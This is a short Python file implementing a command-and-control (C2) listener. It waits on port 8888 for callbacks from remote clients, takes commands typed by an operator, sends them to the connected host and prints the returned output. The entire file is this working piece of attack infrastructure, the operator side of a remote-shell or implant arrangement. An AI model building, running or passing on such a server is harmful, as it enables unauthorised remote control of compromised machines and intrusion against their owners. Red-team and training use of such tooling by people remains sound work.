import asyncio
import sys

server_ip = '0.0.0.0'
port = 8888


async def send_command(reader, writer):
    # Print client callback information
    addr, port = writer.get_extra_info('peername')
    print(f"[*] Received callback from {addr!r}")
    # Enter command to execute
    print("[+] Command to run?")
    command = input(f"{addr}> ")
    message = command.encode()
    writer.write(message)
    await writer.drain()
    print("[*] Command Sent: " + str(command))
    # Read results and print
    try:
        results = await reader.read(1024)
        output = results.decode().strip()
        print(f"[+] Results from {addr}" + "\n" + str(output) + "\n")
        writer.close()
    except ConnectionResetError as e:
        print('[-] Connection Lost')


async def main():
    server = await asyncio.start_server(send_command, server_ip, port)

    addr = server.sockets[0].getsockname()
    print(f'** C2 Serving on {addr} **')

    async with server:
        await server.serve_forever()
# https://stackoverflow.com/questions/48562893/how-to-gracefully-terminate-an-asyncio-script-with-ctrl-c
try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("\n[-] Received exit, exiting")
